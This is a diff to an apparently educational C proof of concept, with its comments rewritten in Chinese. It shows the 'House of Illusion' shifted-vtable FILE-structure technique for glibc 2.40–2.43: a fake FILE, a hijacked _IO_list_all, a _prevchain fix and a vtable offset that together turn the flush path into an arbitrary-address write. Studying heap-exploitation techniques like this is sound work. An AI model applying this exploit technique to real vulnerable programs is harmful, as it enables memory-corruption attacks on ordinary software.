@@ -1,10 +1,11 @@
 #define _GNU_SOURCE
 
 /*
- * House of Illusion 的 shifted vtable 读系统调用，适用于 glibc 2.40～2.43。
+ * House of Illusion 的 shifted vtable 手法，适用于 glibc 2.40～2.43。
  *
- * 与 2.23～2.39 文件相比，唯一重要变化是 fake FILE 必须填写 _prevchain。
- * 底层效果仍是 read(fd, target, length)，即漏洞视角的任意地址写。
+ * 与 2.23～2.39 版本的文件相比，唯一需要注意的变化是 fake FILE 必须
+ * 额外填写 _prevchain 字段。触发的底层系统调用仍然是
+ * read(fd, target, length)，从漏洞利用的角度看依旧是一次任意地址写。
  */
 
 #include <assert.h>
@@ -32,7 +33,8 @@ int main(void)
 
     memset(&fake, 0, sizeof(fake));
 
-    /* dlsym 只代替题目中的 libc 泄漏和符号偏移。 */
+    /* 这里用 dlsym 直接取符号地址，只是省去手写 libc 泄漏和偏移计算的步骤；
+     * 实际题目里这两个符号地址通常要靠已有的信息泄漏拿到。 */
     void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
     unsigned char *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
     assert(io_list_all != NULL && file_jumps != NULL);
@@ -52,12 +54,14 @@ int main(void)
     fake.file._IO_write_ptr = target + sizeof(target);
 
     /*
-     * glibc 2.40 起 FILE+0xb8 被复用为 _prevchain。
-     * fake 是链表头，因此 _prevchain 必须指向 _IO_list_all 这个头指针槽位。
+     * glibc 从 2.40 开始，把 FILE 结构偏移 0xb8 处的空间复用成了
+     * _prevchain 字段。因为 fake 现在是链表里的头节点，所以它的
+     * _prevchain 必须回指到 _IO_list_all 这个保存链表头指针的槽位。
      */
     *(void ***)((char *)&fake.file + 0xb8) = io_list_all;
 
-    /* 槽位平移结果：shifted overflow -> real finish；shifted write -> real read。 */
+    /* vtable 平移之后，槽位的调用关系发生错位：本该调用 overflow 的地方
+     * 实际调用了 finish，本该调用 write 的地方实际调用了 read。 */
     fake.vtable = file_jumps - 0x8;
 
     *io_list_all = &fake;
